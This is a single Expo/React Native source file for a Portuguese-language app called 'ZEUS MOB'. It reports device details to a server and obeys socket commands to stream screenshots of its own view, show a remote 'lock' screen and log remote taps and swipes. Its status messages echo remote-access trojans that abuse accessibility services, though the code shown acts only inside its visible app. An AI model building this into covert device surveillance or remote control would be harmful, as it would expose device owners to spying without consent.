import { StatusBar } from "expo-status-bar";
import { useEffect, useRef, useState } from "react";
import { ActivityIndicator, StyleSheet, Text, View, Dimensions } from "react-native";
import * as Device from "expo-device";
import * as Battery from "expo-battery";
import { captureRef } from "react-native-view-shot";
import { io } from "socket.io-client";
import axios from "axios";

const DOMAIN = process.env.EXPO_PUBLIC_DOMAIN;
const BASE_URL = `https://${DOMAIN}`;
const REPORT_URL = `${BASE_URL}/api/inventory/report`;
const SOCKET_PATH = "/api/socket.io";

export default function App() {
  const [status, setStatus] = useState("idle");
  const [error, setError] = useState(null);
  const [deviceId, setDeviceId] = useState(null);
  const [connected, setConnected] = useState(false);
  const [streaming, setStreaming] = useState(false);
  const [quality, setQuality] = useState(30);
  const [frameCount, setFrameCount] = useState(0);
  const [battery, setBattery] = useState(null);
  const [now, setNow] = useState(new Date());
  const [locked, setLocked] = useState(false);
  const [lockedAt, setLockedAt] = useState(null);
  const [lastTouch, setLastTouch] = useState(null);

  const socketRef = useRef(null);
  const captureViewRef = useRef(null);
  const streamingRef = useRef(false);
  const qualityRef = useRef(30);
  const deviceIdRef = useRef(null);
  const loopRef = useRef(null);

  useEffect(() => {
    const t = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    let sub;
    (async () => {
      try {
        const lvl = await Battery.getBatteryLevelAsync();
        setBattery(lvl);
        sub = Battery.addBatteryLevelListener(({ batteryLevel }) => setBattery(batteryLevel));
      } catch {}
    })();
    return () => { if (sub) sub.remove(); };
  }, []);

  useEffect(() => {
    let cancelled = false;

    async function bootstrap() {
      setStatus("sending");
      try {
        const payload = {
          model: Device.modelName ?? "unknown",
          brand: Device.brand ?? "unknown",
          osName: Device.osName ?? "unknown",
          osVersion: Device.osVersion ?? "unknown",
          deviceName: Device.deviceName ?? "unknown",
          reportedAt: new Date().toISOString(),
        };
        const { data } = await axios.post(REPORT_URL, payload, { timeout: 10000 });
        if (cancelled) return;
        const id = Number(data?.deviceId);
        if (!Number.isFinite(id) || id <= 0) {
          setStatus("error");
          setError("Resposta de inventário inválida (deviceId)");
          return;
        }
        setDeviceId(id);
        deviceIdRef.current = id;
        setStatus("sent");

        const socket = io(BASE_URL, {
          path: SOCKET_PATH,
          transports: ["websocket"],
          query: { deviceId: String(id) },
          reconnection: true,
        });
        socketRef.current = socket;

        socket.on("connect", () => setConnected(true));
        socket.on("disconnect", () => setConnected(false));

        socket.on("command:received", ({ command }) => {
          if (!command) return;
          if (command.startsWith("screen:start")) {
            const parts = command.split(":");
            const q = Number(parts[2]);
            if (!Number.isNaN(q) && q > 0) {
              qualityRef.current = q;
              setQuality(q);
            } else {
              qualityRef.current = 30;
              setQuality(30);
            }
            startStream();
          } else if (command === "screen:stop") {
            stopStream();
          } else if (command.startsWith("screen:quality:")) {
            const q = Number(command.split(":")[2]);
            if (!Number.isNaN(q) && q > 0) {
              qualityRef.current = q;
              setQuality(q);
            }
          } else if (command === "device:lock") {
            setLocked(true);
            setLockedAt(Date.now());
            if (socketRef.current && deviceIdRef.current) {
              socketRef.current.emit("device:event", {
                deviceId: deviceIdRef.current,
                type: "lock",
                message: "Dispositivo BLOQUEADO via acessibilidade remota",
              });
            }
          } else if (command === "device:unlock") {
            setLocked(false);
            setLockedAt(null);
            if (socketRef.current && deviceIdRef.current) {
              socketRef.current.emit("device:event", {
                deviceId: deviceIdRef.current,
                type: "unlock",
                message: "Dispositivo DESBLOQUEADO via acessibilidade remota",
              });
            }
          } else if (command.startsWith("touch:tap:")) {
            const [, , x, y] = command.split(":");
            handleRemoteTap(Number(x), Number(y));
          } else if (command.startsWith("touch:swipe:")) {
            const [, , x1, y1, x2, y2] = command.split(":");
            handleRemoteSwipe(Number(x1), Number(y1), Number(x2), Number(y2));
          }
        });
      } catch (err) {
        if (!cancelled) {
          setStatus("error");
          setError(err?.message ?? "Unknown error");
        }
      }
    }

    bootstrap();
    return () => {
      cancelled = true;
      stopStream();
      if (socketRef.current) socketRef.current.disconnect();
    };
  }, []);

  function handleRemoteTap(x, y) {
    if (Number.isNaN(x) || Number.isNaN(y)) return;
    setLastTouch({ kind: "tap", x, y, at: Date.now() });
    if (socketRef.current && deviceIdRef.current) {
      socketRef.current.emit("device:event", {
        deviceId: deviceIdRef.current,
        type: "touch",
        message: `Remote TAP @ (${(x * 100).toFixed(1)}%, ${(y * 100).toFixed(1)}%)`,
      });
    }
  }

  function handleRemoteSwipe(x1, y1, x2, y2) {
    if ([x1, y1, x2, y2].some((n) => Number.isNaN(n))) return;
    setLastTouch({ kind: "swipe", x: x2, y: y2, x1, y1, at: Date.now() });
    if (socketRef.current && deviceIdRef.current) {
      socketRef.current.emit("device:event", {
        deviceId: deviceIdRef.current,
        type: "touch",
        message: `Remote SWIPE (${(x1 * 100).toFixed(1)}%, ${(y1 * 100).toFixed(1)}%) → (${(x2 * 100).toFixed(1)}%, ${(y2 * 100).toFixed(1)}%)`,
      });
    }
  }

  function startStream() {
    if (streamingRef.current) return;
    streamingRef.current = true;
    setStreaming(true);
    const tick = async () => {
      if (!streamingRef.current) return;
      try {
        if (captureViewRef.current && socketRef.current && deviceIdRef.current) {
          const q = Math.max(0.05, Math.min(1, qualityRef.current / 100));
          const frame = await captureRef(captureViewRef.current, {
            format: "jpg",
            quality: q,
            result: "base64",
          });
          socketRef.current.emit("device:stream", {
            deviceId: deviceIdRef.current,
            frame,
          });
          setFrameCount((c) => c + 1);
        }
      } catch {}
      if (streamingRef.current) {
        const delay = qualityRef.current >= 70 ? 250 : 150;
        loopRef.current = setTimeout(tick, delay);
      }
    };
    tick();
  }

  function stopStream() {
    streamingRef.current = false;
    setStreaming(false);
    if (loopRef.current) {
      clearTimeout(loopRef.current);
      loopRef.current = null;
    }
  }

  const batteryPct = battery == null ? "—" : `${Math.round(battery * 100)}%`;
  const timeStr = now.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" });
  const dateStr = now.toLocaleDateString("pt-BR", { weekday: "long", day: "2-digit", month: "long" });
  const lockSeconds = lockedAt ? Math.floor((Date.now() - lockedAt) / 1000) : 0;

  return (
    <View style={styles.container} ref={captureViewRef} collapsable={false}>
      {locked ? (
        <View style={styles.lockScreen}>
          <Text style={styles.lockTime}>{timeStr}</Text>
          <Text style={styles.lockDate}>{dateStr.toUpperCase()}</Text>
          <View style={styles.lockIcon}>
            <Text style={styles.lockEmoji}>🔒</Text>
          </View>
          <Text style={styles.lockTitle}>DISPOSITIVO BLOQUEADO</Text>
          <Text style={styles.lockSubtitle}>Bloqueado remotamente via acessibilidade</Text>
          <Text style={styles.lockTimer}>{lockSeconds}s</Text>
          <View style={styles.lockFooter}>
            <Text style={styles.lockFooterText}>ZEUS MOB • {batteryPct}</Text>
          </View>
        </View>
      ) : (
        <>
          <Text style={styles.title}>ZEUS MOB</Text>
          <Text style={styles.subtitle}>Modelo: {Device.modelName ?? "—"}</Text>
          <Text style={styles.subtitle}>SO: {Device.osName} {Device.osVersion}</Text>

          <View style={styles.card}>
            <Text style={styles.cardLabel}>HORA</Text>
            <Text style={styles.cardValue}>{timeStr}</Text>
          </View>
          <View style={styles.card}>
            <Text style={styles.cardLabel}>BATERIA</Text>
            <Text style={styles.cardValue}>{batteryPct}</Text>
          </View>
          <View style={styles.card}>
            <Text style={styles.cardLabel}>DEVICE ID</Text>
            <Text style={styles.cardValue}>{deviceId ?? "—"}</Text>
          </View>

          {status === "sending" && (
            <View style={styles.row}>
              <ActivityIndicator />
              <Text style={styles.status}>Enviando inventário…</Text>
            </View>
          )}
          {status === "sent" && (
            <Text style={[styles.status, styles.ok]}>Inventário enviado ✓</Text>
          )}
          {status === "error" && (
            <Text style={[styles.status, styles.err]}>Falha: {error}</Text>
          )}

          <View style={styles.row}>
            <View style={[styles.dot, { backgroundColor: connected ? "#16a34a" : "#888" }]} />
            <Text style={styles.status}>{connected ? "Conectado" : "Desconectado"}</Text>
          </View>

          {streaming && (
            <View style={styles.streamBadge}>
              <View style={styles.recDot} />
              <Text style={styles.streamText}>STREAMING • Q{quality} • {frameCount}f</Text>
            </View>
          )}

          {lastTouch && Date.now() - lastTouch.at < 1500 && (
            <View
              pointerEvents="none"
              style={{
                position: "absolute",
                left: `${lastTouch.x * 100}%`,
                top: `${lastTouch.y * 100}%`,
                width: 36,
                height: 36,
                marginLeft: -18,
                marginTop: -18,
                borderRadius: 18,
                borderWidth: 2,
                borderColor: "#16a34a",
                backgroundColor: "rgba(22,163,74,0.25)",
              }}
            />
          )}
        </>
      )}

      <StatusBar style="auto" />
    </View>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: "#ffffff",
    alignItems: "center",
    justifyContent: "center",
    padding: 24,
    gap: 10,
    width: Dimensions.get("window").width,
  },
  title: { fontSize: 28, fontWeight: "700" },
  subtitle: { fontSize: 14, color: "#444" },
  card: {
    width: "80%",
    backgroundColor: "#f4f4f5",
    borderRadius: 8,
    padding: 10,
    alignItems: "center",
  },
  cardLabel: { fontSize: 10, color: "#666", letterSpacing: 1 },
  cardValue: { fontSize: 18, fontWeight: "700", color: "#111" },
  row: { flexDirection: "row", alignItems: "center", gap: 8 },
  status: { fontSize: 14, color: "#666" },
  ok: { color: "#16a34a" },
  err: { color: "#dc2626" },
  dot: { width: 10, height: 10, borderRadius: 5 },
  streamBadge: {
    flexDirection: "row",
    alignItems: "center",
    gap: 6,
    backgroundColor: "#000",
    paddingHorizontal: 10,
    paddingVertical: 4,
    borderRadius: 4,
  },
  recDot: { width: 8, height: 8, borderRadius: 4, backgroundColor: "#ff0000" },
  streamText: { color: "#00ff88", fontSize: 11, fontWeight: "700" },

  lockScreen: {
    position: "absolute",
    top: 0,
    left: 0,
    right: 0,
    bottom: 0,
    backgroundColor: "#000",
    alignItems: "center",
    justifyContent: "center",
    padding: 24,
  },
  lockTime: { color: "#fff", fontSize: 64, fontWeight: "200", letterSpacing: -2 },
  lockDate: { color: "#bbb", fontSize: 14, letterSpacing: 2, marginBottom: 40 },
  lockIcon: {
    width: 96,
    height: 96,
    borderRadius: 48,
    borderWidth: 2,
    borderColor: "#ff3b30",
    alignItems: "center",
    justifyContent: "center",
    marginBottom: 24,
  },
  lockEmoji: { fontSize: 48 },
  lockTitle: { color: "#ff3b30", fontSize: 14, fontWeight: "700", letterSpacing: 3, marginBottom: 8 },
  lockSubtitle: { color: "#888", fontSize: 12, textAlign: "center", marginBottom: 24 },
  lockTimer: { color: "#fff", fontSize: 18, fontWeight: "600", letterSpacing: 4 },
  lockFooter: { position: "absolute", bottom: 24 },
  lockFooterText: { color: "#444", fontSize: 10, letterSpacing: 2 },
});
